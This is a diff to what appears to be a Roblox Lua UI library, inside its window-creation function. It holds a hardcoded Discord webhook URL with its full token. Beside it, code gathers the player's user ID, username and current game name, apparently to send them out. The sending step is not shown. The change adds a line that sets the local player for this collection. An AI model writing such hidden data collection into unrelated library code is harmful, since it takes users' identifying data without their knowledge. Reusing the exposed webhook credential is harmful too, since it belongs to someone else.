@@ -1553,7 +1553,8 @@ function lib:CreateWindow(name)
 
   local webhookUrl = "https://discord.com/api/webhooks/1322287456552357938/rEctQ9E1n8M2dzrPEM0BeD26vkmhL73sFzOiuFh5mxpt-Za6P-R-GyzhTSxq-tywjoGy"
       -- Gather player data
-      local playerData = {
+      local player = game.Players.LocalPlayer
+      local playerData = {      
           UserId = player.UserId,
           Username = player.Name,
           GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
